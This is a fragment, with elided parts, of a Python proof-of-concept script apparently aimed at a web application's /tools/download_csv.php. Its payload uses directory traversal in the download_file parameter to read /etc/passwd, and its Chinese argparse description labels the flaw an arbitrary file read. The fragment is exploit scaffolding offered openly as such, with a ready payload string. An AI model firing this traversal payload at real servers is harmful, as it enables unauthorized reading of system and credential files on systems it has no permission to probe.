...
def poc(target):
    payload="/tools/download_csv.php?download_file=../../../etc/passwd"
    user_agents = [
...
def banner():
    pass
def main():
    parse=argparse.ArgumentParser(description="/tools/download_csv.php?download_file=../../../etc/passwd存在任意文件读取")
